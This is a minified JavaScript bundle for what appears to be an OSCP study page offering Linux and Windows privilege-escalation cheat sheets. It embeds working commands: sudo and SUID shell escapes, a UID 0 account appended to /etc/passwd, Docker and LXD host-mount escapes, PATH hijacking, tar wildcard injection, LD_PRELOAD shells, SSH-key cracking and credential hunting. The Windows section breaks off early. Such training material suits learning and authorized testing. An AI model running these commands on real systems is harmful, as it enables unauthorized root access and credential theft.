import{a as b,b as f,c as k,d as P,e as C,f as T,g as _,h as M}from"./chunk-4Y2KKK2F.js";import"./chunk-BSVWT34Q.js";import{Da as t,F as h,T as a,Ta as g,Ua as w,Xa as v,Za as y,_ as u,ca as S,ja as r,ka as n,la as e,ma as l,qa as d,ra as c,ta as E,ua as x,y as p}from"./chunk-VZSFBBH7.js";function A(s,o){if(s&1&&(d(0),n(1,"div",9)(2,"h2"),t(3,"Linux Privilege Escalation"),e(),n(4,"p",10),t(5," Systematic enumeration and identification of common Linux privilege escalation vectors. "),e(),n(6,"mat-accordion",11)(7,"mat-expansion-panel")(8,"mat-expansion-panel-header")(9,"mat-panel-title"),t(10,"1. Initial Enumeration"),e()(),n(11,"mat-accordion",11)(12,"mat-expansion-panel")(13,"mat-expansion-panel-header")(14,"mat-panel-title"),t(15,"Basic Enumeration"),e()(),n(16,"p")(17,"strong"),t(18,"Objective:"),e(),t(19," Understand the current user, groups, operating system and environment. "),e(),l(20,"app-terminal",12),n(21,"h3"),t(22,"What to look for"),e(),n(23,"ul")(24,"li"),t(25,"Interesting groups such as sudo, docker, lxd or adm."),e(),n(26,"li"),t(27,"Potentially vulnerable kernel versions."),e(),n(28,"li"),t(29,"Processes running as root."),e(),n(30,"li"),t(31,"Sensitive environment variables."),e()()(),n(32,"mat-expansion-panel")(33,"mat-expansion-panel-header")(34,"mat-panel-title"),t(35,"Process Enumeration"),e()(),n(36,"p"),t(37," Running processes can expose credentials, custom scripts and root-owned services. "),e(),l(38,"app-terminal",12),n(39,"h3"),t(40,"Useful Filters"),e(),l(41,"app-terminal",12),n(42,"h3"),t(43,"Example Red Flags"),e(),l(44,"app-terminal",12),n(45,"ul")(46,"li"),t(47,"Credentials exposed in command-line arguments."),e(),n(48,"li"),t(49,"Root executing scripts from writable directories."),e(),n(50,"li"),t(51,"Unknown or custom binaries running as root."),e(),n(52,"li"),t(53,"Services listening only on localhost."),e()()(),n(54,"mat-expansion-panel")(55,"mat-expansion-panel-header")(56,"mat-panel-title"),t(57,"Bash History"),e()(),n(58,"p"),t(59," Bash history may contain passwords, SSH commands, API keys and reused credentials. "),e(),n(60,"h3"),t(61,"Common History Files"),e(),l(62,"app-terminal",12),n(63,"h3"),t(64,"Search for Sensitive Information"),e(),l(65,"app-terminal",12),n(66,"h3"),t(67,"System-Wide Search"),e(),l(68,"app-terminal",12),e()()(),n(69,"mat-expansion-panel")(70,"mat-expansion-panel-header")(71,"mat-panel-title"),t(72,"2. Sudo Misconfigurations"),e()(),n(73,"mat-accordion",11)(74,"mat-expansion-panel")(75,"mat-expansion-panel-header")(76,"mat-panel-title"),t(77,"Initial Check"),e()(),n(78,"p")(79,"strong"),t(80,"Always run this early."),e(),t(81," Check which commands the current user can execute with sudo. "),e(),l(82,"app-terminal",12),n(83,"h3"),t(84,"Look for"),e(),n(85,"ul")(86,"li"),t(87,"NOPASSWD entries."),e(),n(88,"li"),t(89,"Wildcard permissions."),e(),n(90,"li"),t(91,"SETENV permissions."),e(),n(92,"li"),t(93,"Unsafe binaries executed as root."),e()()(),n(94,"mat-expansion-panel")(95,"mat-expansion-panel-header")(96,"mat-panel-title"),t(97,"High-Risk Binaries"),e()(),n(98,"p"),t(99," If one of these binaries is available through sudo, check GTFOBins immediately. "),e(),l(100,"app-terminal",12),e(),n(101,"mat-expansion-panel")(102,"mat-expansion-panel-header")(103,"mat-panel-title"),t(104,"Common Sudo Escapes"),e()(),n(105,"mat-accordion",11)(106,"mat-expansion-panel")(107,"mat-expansion-panel-header")(108,"mat-panel-title"),t(109,"Vim / Vi"),e()(),l(110,"app-terminal",12),e(),n(111,"mat-expansion-panel")(112,"mat-expansion-panel-header")(113,"mat-panel-title"),t(114,"Less / More"),e()(),l(115,"app-terminal",12),e(),n(116,"mat-expansion-panel")(117,"mat-expansion-panel-header")(118,"mat-panel-title"),t(119,"Find"),e()(),l(120,"app-terminal",12),e(),n(121,"mat-expansion-panel")(122,"mat-expansion-panel-header")(123,"mat-panel-title"),t(124,"Awk"),e()(),l(125,"app-terminal",12),e(),n(126,"mat-expansion-panel")(127,"mat-expansion-panel-header")(128,"mat-panel-title"),t(129,"Python"),e()(),l(130,"app-terminal",12),e(),n(131,"mat-expansion-panel")(132,"mat-expansion-panel-header")(133,"mat-panel-title"),t(134,"Perl"),e()(),l(135,"app-terminal",12),e()()()()(),n(136,"mat-expansion-panel")(137,"mat-expansion-panel-header")(138,"mat-panel-title"),t(139,"3. SUID Binaries"),e()(),n(140,"p"),t(141," SUID binaries execute with the privileges of their owner. Root-owned SUID binaries can potentially lead to privilege escalation. "),e(),l(142,"app-terminal",12),n(143,"h3"),t(144,"Example"),e(),l(145,"app-terminal",12),n(146,"p"),t(147," After identifying interesting binaries, check whether they can be abused using GTFOBins. "),e()(),n(148,"mat-expansion-panel")(149,"mat-expansion-panel-header")(150,"mat-panel-title"),t(151,"4. Linux Capabilities"),e()(),n(152,"p"),t(153," Linux capabilities can grant privileged functionality to binaries without requiring full root privileges. "),e(),n(154,"h3"),t(155,"Enumeration"),e(),l(156,"app-terminal",12),n(157,"h3"),t(158,"Dangerous Example"),e(),l(159,"app-terminal",12),n(160,"h3"),t(161,"Possible Abuse"),e(),l(162,"app-terminal",12),e(),n(163,"mat-expansion-panel")(164,"mat-expansion-panel-header")(165,"mat-panel-title"),t(166,"5. Cron Jobs"),e()(),n(167,"p"),t(168," Scheduled tasks are especially interesting when root executes scripts that can be modified by a lower-privileged user. "),e(),l(169,"app-terminal",12),n(170,"h3"),t(171,"Look for"),e(),n(172,"ul")(173,"li"),t(174,"Root-owned cron jobs."),e(),n(175,"li"),t(176,"Writable scripts executed by root."),e(),n(177,"li"),t(178,"Relative paths."),e(),n(179,"li"),t(180,"PATH hijacking opportunities."),e()()(),n(181,"mat-expansion-panel")(182,"mat-expansion-panel-header")(183,"mat-panel-title"),t(184,"6. Writable Files & Permissions"),e()(),n(185,"p"),t(186," Not every writable file is useful. Prioritize files that influence authentication, execution or privileged services. "),e(),l(187,"app-terminal",12),n(188,"h3"),t(189,"High-Value Targets"),e(),n(190,"ol")(191,"li"),t(192,"/etc/sudoers"),e(),n(193,"li"),t(194,"/etc/passwd"),e(),n(195,"li"),t(196,"/etc/shadow"),e(),n(197,"li"),t(198,"/etc/crontab"),e(),n(199,"li"),t(200,"/etc/cron.*"),e(),n(201,"li"),t(202,"Systemd service files."),e(),n(203,"li"),t(204,"Application configuration files."),e()()(),n(205,"mat-expansion-panel")(206,"mat-expansion-panel-header")(207,"mat-panel-title"),t(208,"7. Writable /etc/passwd"),e()(),n(209,"mat-accordion",11)(210,"mat-expansion-panel")(211,"mat-expansion-panel-header")(212,"mat-panel-title"),t(213,"Check Permissions"),e()(),l(214,"app-terminal",12),n(215,"p"),t(216," A writable "),n(217,"code"),t(218,"/etc/passwd"),e(),t(219," can potentially allow the creation of a privileged account. "),e()(),n(220,"mat-expansion-panel")(221,"mat-expansion-panel-header")(222,"mat-panel-title"),t(223,"Generate Password Hash"),e()(),l(224,"app-terminal",12),e(),n(225,"mat-expansion-panel")(226,"mat-expansion-panel-header")(227,"mat-panel-title"),t(228,"Create UID 0 User"),e()(),n(229,"p"),t(230," Replace "),n(231,"code"),t(232,"HASH"),e(),t(233," with the generated password hash. "),e(),l(234,"app-terminal",12),e(),n(235,"mat-expansion-panel")(236,"mat-expansion-panel-header")(237,"mat-panel-title"),t(238,"Switch User"),e()(),l(239,"app-terminal",12),e()()(),n(240,"mat-expansion-panel")(241,"mat-expansion-panel-header")(242,"mat-panel-title"),t(243,"8. Docker / LXD Groups"),e()(),n(244,"mat-accordion",11)(245,"mat-expansion-panel")(246,"mat-expansion-panel-header")(247,"mat-panel-title"),t(248,"Check Groups"),e()(),l(249,"app-terminal",12),n(250,"p"),t(251," Pay special attention to groups such as "),n(252,"code"),t(253,"docker"),e(),t(254,", "),n(255,"code"),t(256,"lxd"),e(),t(257," and other privileged groups. "),e()(),n(258,"mat-expansion-panel")(259,"mat-expansion-panel-header")(260,"mat-panel-title"),t(261,"Docker"),e()(),l(262,"app-terminal",12),e(),n(263,"mat-expansion-panel")(264,"mat-expansion-panel-header")(265,"mat-panel-title"),t(266,"LXD"),e()(),l(267,"app-terminal",12),e()()(),n(268,"mat-expansion-panel")(269,"mat-expansion-panel-header")(270,"mat-panel-title"),t(271,"9. PATH Hijacking"),e()(),n(272,"mat-accordion",11)(273,"mat-expansion-panel")(274,"mat-expansion-panel-header")(275,"mat-panel-title"),t(276,"PATH Reconnaissance"),e()(),l(277,"app-terminal",12),e(),n(278,"mat-expansion-panel")(279,"mat-expansion-panel-header")(280,"mat-panel-title"),t(281,"Writable PATH Directories"),e()(),l(282,"app-terminal",12),e(),n(283,"mat-expansion-panel")(284,"mat-expansion-panel-header")(285,"mat-panel-title"),t(286,"Create Hijack Binary"),e()(),l(287,"app-terminal",12),n(288,"p"),t(289," This becomes interesting when a privileged script executes commands without using absolute paths. "),e()()()(),n(290,"mat-expansion-panel")(291,"mat-expansion-panel-header")(292,"mat-panel-title"),t(293,"10. Wildcard Injection"),e()(),n(294,"p"),t(295," Wildcards can be dangerous when attacker-controlled filenames are expanded into arguments for privileged commands. "),e(),n(296,"h3"),t(297,"Common Risk Patterns"),e(),l(298,"app-terminal",12),n(299,"h3"),t(300,"Tar Example"),e(),l(301,"app-terminal",12),n(302,"p"),t(303," Always inspect the available options of the binary rather than guessing possible arguments. "),e()(),n(304,"mat-expansion-panel")(305,"mat-expansion-panel-header")(306,"mat-panel-title"),t(307,"11. Password & Credential Hunting"),e()(),n(308,"mat-accordion",11)(309,"mat-expansion-panel")(310,"mat-expansion-panel-header")(311,"mat-panel-title"),t(312,"Password Hunting"),e()(),l(313,"app-terminal",12),e(),n(314,"mat-expansion-panel")(315,"mat-expansion-panel-header")(316,"mat-panel-title"),t(317,"SSH Private Keys"),e()(),n(318,"h3"),t(319,"Find Keys"),e(),l(320,"app-terminal",12),n(321,"h3"),t(322,"Fix Permissions"),e(),l(323,"app-terminal",12),n(324,"h3"),t(325,"Login Using the Key"),e(),l(326,"app-terminal",12),n(327,"h3"),t(328,"Crack Protected Keys"),e(),l(329,"app-terminal",12),e()()(),n(330,"mat-expansion-panel")(331,"mat-expansion-panel-header")(332,"mat-panel-title"),t(333,"12. LD_PRELOAD"),e()(),n(334,"mat-accordion",11)(335,"mat-expansion-panel")(336,"mat-expansion-panel-header")(337,"mat-panel-title"),t(338,"Check Sudo Configuration"),e()(),l(339,"app-terminal",12),n(340,"p"),t(341,"Look for permissions related to environment preservation or SETENV."),e()(),n(342,"mat-expansion-panel")(343,"mat-expansion-panel-header")(344,"mat-panel-title"),t(345,"Compile Shared Library"),e()(),l(346,"app-terminal",12),e(),n(347,"mat-expansion-panel")(348,"mat-expansion-panel-header")(349,"mat-panel-title"),t(350,"Execute with LD_PRELOAD"),e()(),l(351,"app-terminal",12),e()()(),n(352,"mat-expansion-panel")(353,"mat-expansion-panel-header")(354,"mat-panel-title"),t(355,"13. Kernel Exploits"),e()(),n(356,"p"),t(357," Kernel exploitation should generally be considered after checking simpler and more reliable privilege escalation vectors. "),e(),l(358,"app-terminal",12),n(359,"p"),t(360," Always verify the exact kernel version and exploit requirements before attempting exploitation. "),e()(),n(361,"mat-expansion-panel")(362,"mat-expansion-panel-header")(363,"mat-panel-title"),t(364,"14. OSCP Mental Flow"),e()(),n(365,"p"),t(366," A simple workflow to avoid missing the most common Linux privilege escalation vectors. "),e(),l(367,"app-terminal",12),n(368,"h3"),t(369,"Quick Priority"),e(),n(370,"ol")(371,"li"),t(372,"Understand your current user and groups."),e(),n(373,"li"),t(374,"Run "),n(375,"code"),t(376,"sudo -l"),e(),t(377,"."),e(),n(378,"li"),t(379,"Enumerate SUID binaries."),e(),n(380,"li"),t(381,"Check capabilities."),e(),n(382,"li"),t(383,"Inspect cron jobs and scheduled tasks."),e(),n(384,"li"),t(385,"Look for writable files and scripts."),e(),n(386,"li"),t(387,"Check Docker and LXD group membership."),e(),n(388,"li"),t(389,"Search for credentials."),e(),n(390,"li"),t(391,"Consider kernel exploits as a later option."),e()()()()(),c()),s&2){let i=x();a(20),r("command",i.basicEnumeration),a(18),r("command",i.processEnumeration),a(3),r("command",i.processFilters),a(3),r("command",i.processRedFlags),a(18),r("command",i.bashHistory),a(3),r("command",i.bashHistorySearch),a(3),r("command",i.bashHistorySystem),a(14),r("command",i.sudoCheck),a(18),r("command",i.sudoHighRisk),a(10),r("command",i.sudoVim),a(5),r("command",i.sudoLess),a(5),r("command",i.sudoFind),a(5),r("command",i.sudoAwk),a(5),r("command",i.sudoPython),a(5),r("command",i.sudoPerl),a(7),r("command",i.suidEnumeration),a(3),r("command",i.suidExample),a(11),r("command",i.capabilities),a(3),r("command",i.capabilitiesExample),a(3),r("command",i.capabilitiesExploit),a(7),r("command",i.cronEnumeration),a(18),r("command",i.writableFiles),a(27),r("command",i.passwdPermissions),a(10),r("command",i.passwdHash),a(10),r("command",i.passwdInject),a(5),r("command",i.passwdSwitch),a(10),r("command",i.dockerGroups),a(13),r("command",i.dockerEscape),a(5),r("command",i.lxdEscape),a(10),r("command",i.pathRecon),a(5),r("command",i.pathWritable),a(5),r("command",i.pathHijack),a(11),r("command",i.wildcardExamples),a(3),r("command",i.wildcardTar),a(12),r("command",i.passwordHunting),a(7),r("command",i.sshKeys),a(3),r("command",i.sshKeyPermissions),a(3),r("command",i.sshLogin),a(3),r("command",i.sshKeyCrack),a(10),r("command",i.ldPreloadCheck),a(7),r("command",i.ldPreloadCompile),a(5),r("command",i.ldPreloadExploit),a(7),r("command",i.kernelEnumeration),a(9),r("command",i.oscpMentalFlow)}}function H(s,o){if(s&1&&(d(0),n(1,"div",9)(2,"h2"),t(3,"Windows Privilege Escalation"),e(),n(4,"p",10),t(5," Windows privilege escalation enumeration, exploitation and OSCP methodology. "),e(),n(6,"mat-accordion",11)(7,"mat-expansion-panel")(8,"mat-expansion-panel-header")(9,"mat-panel-title"),t(10,"1. Identity & Token Enumeration"),e()(),n(11,"p"),t(12," Always start by identifying the current user, groups, privileges and integrity level. "),e(),l(13,"app-terminal",12),n(14,"p")(15,"strong"),t(16,"Important privileges:"),e()(),n(17,"ul")(18,"li")(19,"strong"),t(20,"SeBackupPrivilege"),e(),t(21," \u2192 Dump SAM / SYSTEM."),e(),n(22,"li")(23,"strong"),t(24,"SeRestorePrivilege"),e(),t(25," \u2192 Overwrite protected files."),e(),n(26,"li")(27,"strong"),t(28,"SeImpersonatePrivilege"),e(),t(29," \u2192 Token impersonation."),e(),n(30,"li")(31,"strong"),t(32,"High Integrity"),e(),t(33," \u2192 Elevated token."),e()()(),n(34,"mat-expansion-panel")(35,"mat-expansion-panel-header")(36,"mat-panel-title"),t(37,"2. Users & Groups"),e()(),n(38,"p"),t(39,"Enumerate local and domain users and identify privileged group membership."),e(),l(40,"app-terminal",12),e(),n(41,"mat-expansion-panel")(42,"mat-expansion-panel-header")(43,"mat-panel-title"),t(44,"3. System Enumeration"),e()(),l(45,"app-terminal",12),n(46,"p")(47,"strong"),t(48,"Drivers:"),e()(),l(49,"app-terminal",12),e(),n(50,"mat-expansion-panel")(51,"mat-expansion-panel-header")(52,"mat-panel-title"),t(53,"4. Network Enumeration"),e()(),l(54,"app-terminal",12),e(),n(55,"mat-expansion-panel")(56,"mat-expansion-panel-header")(57,"mat-panel-title"),t(58,"5. Credential Hunting"),e()(),n(59,"mat-accordion",11)(60,"mat-expansion-panel")(61,"mat-expansion-panel-header")(62,"mat-panel-title"),t(63,"File Searching"),e()(),l(64,"app-terminal",12),e(),n(65,"mat-expansion-panel")(66,"mat-expansion-panel-header")(67,"mat-panel-title"),t(68,"Registry Credentials"),e()(),l(69,"app-terminal",12),e(),n(70,"mat-expansion-panel")(71,"mat-expansion-panel-header")(72,"mat-panel-title"),t(73,"Saved Credentials"),e()(),l(74,"app-terminal",12),e(),n(75,"mat-expansion-panel")(76,"mat-expansion-panel-header")(77,"mat-panel-title"),t(78,"PowerShell History"),e()(),l(79,"app-terminal",12),e()()(),n(80,"mat-expansion-panel")(81,"mat-expansion-panel-header")(82,"mat-panel-title"),t(83,"6. Interesting Files Enumeration"),e()(),n(84,"p"),t(85," Search for configuration files, scripts, backups and documents that may contain credentials, connection strings, tokens or other useful information. "),e(),l(86,"app-terminal",12),e(),n(87,"mat-expansion-panel")(88,"mat-expansion-panel-header")(89,"mat-panel-title"),t(90,"7. Services Enumeration"),e()(),l(91,"app-terminal",12),n(92,"p")(93,"strong"),t(94,"Look for:"),e()(),n(95,"ul")(96,"li"),t(97,"Unquoted service paths."),e(),n(98,"li"),t(99,"Writable service binaries."),e(),n(100,"li"),t(101,"Weak service permissions."),e(),n(102,"li"),t(103,"Services running as SYSTEM."),e()()(),n(104,"mat-expansion-panel")(105,"mat-expansion-panel-header")(106,"mat-panel-title"),t(107,"8. Unquoted Service Paths"),e()(),n(108,"p"),t(109," An unquoted service path containing spaces may allow Windows to execute an unexpected binary if an intermediate directory is writable. "),e(),l(110,"app-terminal",12),n(111,"p")(112,"strong"),t(113,"All conditions must be true:"),e()(),n(114,"ul")(115,"li"),t(116,"The path contains spaces."),e(),n(117,"li"),t(118,"The executable path is not quoted."),e(),n(119,"li"),t(120,"An intermediate directory is writable."),e(),n(121,"li"),t(122,"The service can be triggered."),e()(),n(123,"p")(124,"strong"),t(125,"Important:"),e(),t(126," An unquoted path alone does not make a service exploitable. "),e()(),n(127,"mat-expansion-panel")(128,"mat-expansion-panel-header")(129,"mat-panel-title"),t(130,"9. Service Binary Hijacking"),e()(),n(131,"p"),t(132," If a service runs as SYSTEM and its executable is writable, replacing the binary can result in SYSTEM code execution. "),e(),l(133,"app-terminal",12),n(134,"p")(135,"strong"),t(136,"Exploitation conditions:"),e()(),n(137,"ul")(138,"li"),t(139,"Service runs as LocalSystem."),e(),n(140,"li"),t(141,"Binary is writable."),e(),n(142,"li"),t(143,"The service can be restarted or triggered."),e()(),n(144,"p")(145,"strong"),t(146,"OSCP rule:"),e()(),l(147,"app-terminal",12),e(),n(148,"mat-expansion-panel")(149,"mat-expansion-panel-header")(150,"mat-panel-title"),t(151,"10. DLL Hijacking"),e()(),n(152,"p"),t(153," Look for applications or services loading DLLs from writable directories. "),e(),l(154,"app-terminal",12),e(),n(155,"mat-expansion-panel")(156,"mat-expansion-panel-header")(157,"mat-panel-title"),t(158,"11. Scheduled Tasks"),e()(),n(159,"mat-accordion",11)(160,"mat-expansion-panel")(161,"mat-expansion-panel-header")(162,"mat-panel-title"),t(163,"Enumeration"),e()(),l(164,"app-terminal",12),e(),n(165,"mat-expansion-panel")(166,"mat-expansion-panel-header")(167,"mat-panel-title"),t(168,"Task Filtering"),e()(),l(169,"app-terminal",12),e(),n(170,"mat-expansion-panel")(171,"mat-expansion-panel-header")(172,"mat-panel-title"),t(173,"Inspect Task"),e()(),l(174,"app-terminal",12),e(),n(175,"mat-expansion-panel")(176,"mat-expansion-panel-header")(177,"mat-panel-title"),t(178,"Referenced Files"),e()(),l(179,"app-terminal",12),e(),n(180,"mat-expansion-panel")(181,"mat-expansion-panel-header")(182,"mat-panel-title"),t(183,"Permissions"),e()(),l(184,"app-terminal",12),e()()(),n(185,"mat-expansion-panel")(186,"mat-expansion-panel-header")(187,"mat-panel-title"),t(188,"12. SeImpersonatePrivilege Abuse"),e()(),n(189,"p"),t(190," Check whether the current account possesses SeImpersonatePrivilege. "),e(),l(191,"app-terminal",12),n(192,"p"),t(193," If the privilege is enabled, token impersonation techniques may allow escalation to SYSTEM depending on the Windows version and execution context. "),e(),l(194,"app-terminal",12),e(),n(195,"mat-expansion-panel")(196,"mat-expansion-panel-header")(197,"mat-panel-title"),t(198,"13. Backup Operators Abuse"),e()(),n(199,"p"),t(200," Backup-related privileges may allow access to protected registry hives and other sensitive files. "),e(),l(201,"app-terminal",12),n(202,"p")(203,"strong"),t(204,"Offline hash extraction:"),e()(),l(205,"app-terminal",12),n(206,"p")(207,"strong"),t(208,"Pass-the-Hash:"),e()(),l(209,"app-terminal",12),e(),n(210,"mat-expansion-panel")(211,"mat-expansion-panel-header")(212,"mat-panel-title"),t(213,"14. Kernel Exploits"),e()(),n(214,"p"),t(215," Consider kernel exploitation only after normal privilege escalation enumeration has been exhausted. "),e(),l(216,"app-terminal",12),e(),n(217,"mat-expansion-panel")(218,"mat-expansion-panel-header")(219,"mat-panel-title"),t(220,"15. Automated Enumeration"),e()(),n(221,"p"),t(222," Automated tools are useful for finding potential misconfigurations, but every finding should be manually verified. "),e(),l(223,"app-terminal",12),n(224,"p")(225,"strong"),t(226,"Always verify manually:"),e()(),l(227,"app-terminal",12),e(),n(228,"mat-expansion-panel")(229,"mat-expansion-panel-header")(230,"mat-panel-title"),t(231,"16. OSCP Mental Checklist"),e()(),n(232,"ol")(233,"li"),t(234,"Who am I?"),e(),n(235,"li"),t(236,"What privileges do I have?"),e(),n(237,"li"),t(238,"What groups am I a member of?"),e(),n(239,"li"),t(240,"Any interesting credentials?"),e(),n(241,"li"),t(242,"Any writable services?"),e(),n(243,"li"),t(244,"Any unquoted service paths?"),e(),n(245,"li"),t(246,"Any scheduled tasks?"),e(),n(247,"li"),t(248,"Do I have SeImpersonatePrivilege?"),e(),n(249,"li"),t(250,"Am I a member of Backup Operators?"),e(),n(251,"li"),t(252,"Any writable files or directories?"),e(),n(253,"li"),t(254,"Any interesting scripts or configuration files?"),e(),n(255,"li"),t(256,"Any kernel-level vulnerability?"),e()()(),n(257,"mat-expansion-panel")(258,"mat-expansion-panel-header")(259,"mat-panel-title"),t(260,"17. Windows PrivEsc Practical Checklist"),e()(),n(261,"mat-accordion",11)(262,"mat-expansion-panel")(263,"mat-expansion-panel-header")(264,"mat-panel-title"),t(265,"Initial Enumeration"),e()(),n(266,"ul")(267,"li"),t(268,"Ran whoami /all."),e(),n(269,"li"),t(270,"Checked privileges."),e(),n(271,"li"),t(272,"Checked groups."),e(),n(273,"li"),t(274,"Identified Integrity Level."),e()()(),n(275,"mat-expansion-panel")(276,"mat-expansion-panel-header")(277,"mat-panel-title"),t(278,"System & Patch Level"),e()(),n(279,"ul")(280,"li"),t(281,"Ran systeminfo."),e(),n(282,"li"),t(283,"Checked installed hotfixes."),e(),n(284,"li"),t(285,"Identified OS architecture."),e()()(),n(286,"mat-expansion-panel")(287,"mat-expansion-panel-header")(288,"mat-panel-title"),t(289,"Credential Hunting"),e()(),n(290,"ul")(291,"li"),t(292,"Searched for password files."),e(),n(293,"li"),t(294,"Checked registry credentials."),e(),n(295,"li"),t(296,"Checked cmdkey."),e(),n(297,"li"),t(298,"Checked PowerShell history."),e()()(),n(299,"mat-expansion-panel")(300,"mat-expansion-panel-header")(301,"mat-panel-title"),t(302,"Services & Tasks"),e()(),n(303,"ul")(304,"li"),t(305,"Enumerated services."),e(),n(306,"li"),t(307,"Checked unquoted service paths."),e(),n(308,"li"),t(309,"Checked service binary permissions."),e(),n(310,"li"),t(311,"Enumerated scheduled tasks."),e(),n(312,"li"),t(313,"Checked task binary/script permissions."),e()()(),n(314,"mat-expansion-panel")(315,"mat-expansion-panel-header")(316,"mat-panel-title"),t(317,"Privilege Abuse"),e()(),n(318,"ul")(319,"li"),t(320,"Checked SeImpersonatePrivilege."),e(),n(321,"li"),t(322,"Checked Backup Operators."),e(),n(323,"li"),t(324,"Checked writable files and directories."),e()()(),n(325,"mat-expansion-panel")(326,"mat-expansion-panel-header")(327,"mat-panel-title"),t(328,"Advanced"),e()(),n(329,"ul")(330,"li"),t(331,"Ran automated enumeration tools."),e(),n(332,"li"),t(333,"Manually verified findings."),e(),n(334,"li"),t(335,"Checked for kernel vulnerabilities."),e()()()()()()(),c()),s&2){let i=x();a(13),r("command",i.windowsIdentity),a(27),r("command",i.windowsUsersGroups),a(5),r("command",i.windowsSystem),a(4),r("command",i.windowsDrivers),a(5),r("command",i.windowsNetwork),a(10),r("command",i.windowsCredentialHunting),a(5),r("command",i.windowsRegistryCredentials),a(5),r("command",i.windowsSavedCredentials),a(5),r("command",i.windowsPowerShellHistory),a(7),r("command",i.windowsInterestingFiles),a(5),r("command",i.windowsServices),a(19),r("command",i.windowsUnquotedPaths),a(23),r("command",i.windowsServiceBinary),a(14),r("command",i.windowsServiceRule),a(7),r("command",i.windowsDLLHijacking),a(10),r("command",i.windowsScheduledTasks),a(5),r("command",i.windowsTaskFiltering),a(5),r("command",i.windowsTaskInspect),a(5),r("command",i.windowsTaskFiles),a(5),r("command",i.windowsTaskPermissions),a(7),r("command",i.windowsSeImpersonate),a(3),r("command",i.windowsPotato),a(7),r("command",i.windowsBackupOperators),a(4),r("command",i.windowsSecretsDump),a(4),r("command",i.windowsPassTheHash),a(7),r("command",i.windowsKernel),a(7),r("command",i.windowsAutomatedEnum),a(4),r("command",i.windowsManualVerify)}}var O=class s{selected="linux";systems=[{id:"linux",label:"Linux PrivEsc"},{id:"windows",label:"Windows PrivEsc"}];route=p(v);router=p(y);destroyRef=p(h);ngOnInit(){this.route.queryParamMap.pipe(T(this.destroyRef)).subscribe(o=>{let i=o.get("system");i&&this.systems.some(m=>m.id===i)&&(this.selected=i)})}basicEnumeration=`
id
whoami
groups
hostname
uname -a
uname -r
arch
cat /etc/issue
cat /etc/os-release
ps aux
env
`;sudoCheck=`
sudo -l
`;sudoHighRisk=`
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/less
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/awk
(root) NOPASSWD: /usr/bin/python
(root) NOPASSWD: /usr/bin/perl
(root) NOPASSWD: /usr/bin/tar *
`;sudoVim=`
sudo vim -c ':!/bin/bash'
`;sudoLess=`
sudo less /etc/passwd
!sh
`;sudoFind=`
sudo find . -exec /bin/sh \\; -quit
`;sudoAwk=`
sudo awk 'BEGIN {system("/bin/bash")}'
`;sudoPython=`
sudo python3 -c 'import os; os.system("/bin/bash")'
`;sudoPerl=`
sudo perl -e 'exec "/bin/bash";'
`;processEnumeration=`
ps aux
ps -ef
ps auxww
`;processFilters=`
ps aux | grep root
ps aux | grep -E "python|bash|sh|perl|php"
ps aux | grep -i password
ps auxww | grep -v "\\["
`;processRedFlags=`
root  /usr/bin/python /opt/app/app.py --db-pass=admin123
root  /tmp/backup.sh
root  /home/user/service --token=abcd1234
`;bashHistory=`
cat ~/.bash_history
cat /home/*/.bash_history
cat /root/.bash_history
`;bashHistorySearch=`
grep -i "password" ~/.bash_history
grep -i "ssh" ~/.bash_history
grep -i "wget" ~/.bash_history
grep -i "curl" ~/.bash_history
`;bashHistorySystem=`
find / -name ".bash_history" 2>/dev/null
find /home -type f -name ".bash_history" 2>/dev/null
`;suidEnumeration=`
find / -perm -u=s -type f 2>/dev/null
`;suidExample=`
find . -exec /bin/sh -p \\; -quit
`;capabilities=`
getcap -r / 2>/dev/null
`;capabilitiesExample=`
/usr/bin/python = cap_setuid+ep
`;capabilitiesExploit=`
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
`;cronEnumeration=`
crontab -l
ls -lah /etc/cron*
cat /etc/crontab
`;writableFiles=`
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
`;passwdPermissions=`
ls -l /etc/passwd
`;passwdHash=`
openssl passwd w00t
`;passwdInject=`
echo "root2:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
`;passwdSwitch=`
su root2

id
`;kernelEnumeration=`
uname -r
searchsploit linux kernel <version>
`;dockerGroups=`
id
groups
`;dockerEscape=`
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
`;lxdEscape=`
lxc init alpine privesc -c security.privileged=true

lxc config device add privesc root disk source=/ path=/mnt/root recursive=true

lxc start privesc

lxc exec privesc /bin/sh
`;pathRecon=`
echo $PATH
env | grep PATH
ps aux
crontab -l
cat /etc/crontab
ls -lah /etc/cron*
systemctl list-timers --all
`;pathWritable=`
find / -writable -type d 2>/dev/null | grep -E "tmp|home|var"

echo $PATH | tr ":" "\\n"
`;pathHijack=`
echo -e '#!/bin/bash\\n/bin/bash' > ls

chmod +x ls

export PATH=/tmp:$PATH
`;wildcardExamples=`
sudo /usr/bin/tar -czvf /backup/backup.tar.gz *

sudo zip archive.zip *

sudo rsync -a * /backup/

sudo chown root:root *

sudo chmod 755 *
`;wildcardTar=`
touch -- "--checkpoint=1"

touch -- "--checkpoint-action=exec=bash shell.sh"

sudo tar -czvf /tmp/backup.tar.gz *
`;passwordHunting=`
grep -Ri "password" /home 2>/dev/null

cat ~/.bash_history

cat /var/www/html/config.php
`;sshKeys=`
find / -name id_rsa 2>/dev/null
`;sshKeyPermissions=`
chmod 600 id_rsa
`;sshLogin=`
ssh -i id_rsa user@target
`;sshKeyCrack=`
ssh2john id_rsa > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
`;ldPreloadCheck=`
sudo -l
`;ldPreloadCompile=`
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
`;ldPreloadExploit=`
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/<binary>
`;oscpMentalFlow=`
1. id / groups
2. sudo -l
3. SUID
4. Capabilities
5. Cron jobs
6. Writable files
7. Docker / LXD
8. Kernel exploit
`;windowsIdentity=`
whoami
echo %USERNAME%
whoami /priv
whoami /groups
whoami /all
`;windowsUsersGroups=`
net user
net user username
net localgroup
net localgroup Administrators
net user /domain
net group /domain
`;windowsSystem=`
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic logicaldisk get caption,description
wmic product get name,version,vendor
`;windowsDrivers=`
driverquery /v
